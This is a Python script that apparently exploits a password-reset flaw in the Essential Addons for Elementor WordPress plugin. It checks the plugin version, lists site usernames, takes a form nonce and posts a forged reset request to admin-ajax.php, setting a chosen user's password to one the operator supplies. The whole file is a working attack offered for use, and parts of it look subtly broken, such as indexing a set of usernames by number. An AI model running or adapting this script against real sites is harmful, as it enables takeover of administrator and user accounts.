import argparse
import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



def extract_nonce(response_text):
    soup = BeautifulSoup(response_text, "html.parser")
    nonce = soup.find("input", {"name": "eael-resetpassword-nonce"})["value"]
    print(f"Nonce value: {nonce}")
    return nonce


def extract_usernames(url):
    response = requests.get(f"{url}/wp-admin/users.php")
    soup = BeautifulSoup(response.text, "html.parser")
    all_usernames = set()
    for user_row in soup.find_all("tr", {"class": "user"}):
        username = user_row.find("td", {"class": "username column-username"}).text.strip()
        all_usernames.add(username)
    return all_usernames


def select_username(usernames):
    for index, username in enumerate(usernames):
        print(f"{index}: {username}")
    selection = input("Select a username by number: ")
    return usernames[int(selection)]


def send_request(wordpress_url, username, password, nonce):
    url = f"{wordpress_url}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    payload = {
        "action": "login_or_register_user",
        "eael-resetpassword-submit": "true",
        "page_id": "124",
        "widget_id": "224",
        "eael-resetpassword-nonce": nonce,
        "eael-pass1": password,
        "eael-pass2": password,
        "rp_login": username
    }

    response = requests.post(url, headers=headers, data=payload, verify=False)

    if "Your password has been reset" in response.text:
        print("Username:", username)
        print("Password:", password)
        print("All Done, Password has been reset")
    else:
        print("Sorry, something went wrong.")
        print(response.text)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WordPress password reset script")
    parser.add_argument("-u", "--url", type=str, required=True, help="WordPress site URL")
    parser.add_argument("-p", "--password", type=str, required=True, help="New password for user")

    args = parser.parse_args()

    try:
        response = requests.get(f"{args.url}/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt")
        if "5.7.2" in response.text:
            print("Sorry, unable to do anything.")
            exit(0)

        all_usernames = extract_usernames(args.url)
        if not all_usernames:
            print("Sorry, unable to help")
            exit(0)

        selected_username = select_username(all_usernames)

        response = requests.get(f"{args.url}/wp-admin/profile.php")
        nonce = extract_nonce(response.text)

        send_request(args.url, selected_username, args.password, nonce)

    except Exception as e:
        print(f"Error: {e}")
